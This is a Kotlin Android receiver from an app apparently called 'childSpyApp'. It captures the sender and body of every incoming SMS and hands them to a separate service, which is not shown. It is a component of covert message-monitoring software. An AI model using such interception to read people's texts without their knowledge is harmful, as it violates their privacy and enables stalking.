package sammy.mutahi.gicheru.childSpyApp.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import sammy.mutahi.gicheru.childSpyApp.services.sms.SmsService
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SMS_ADDRESS
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SMS_BODY



class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {

        var smsAddress = ""
        var smsBody = ""

        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION){
            for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                smsAddress = smsMessage.displayOriginatingAddress
                smsBody += smsMessage.messageBody
            }
            context.setIntent(smsAddress,smsBody)
        }
    }

    private fun Context.setIntent(smsAddress:String,smsBody:String){
        val myIntent = Intent(this, SmsService::class.java)
        myIntent.putExtra(SMS_ADDRESS,smsAddress)
        myIntent.putExtra(SMS_BODY,smsBody)
        startService(myIntent)
    }

}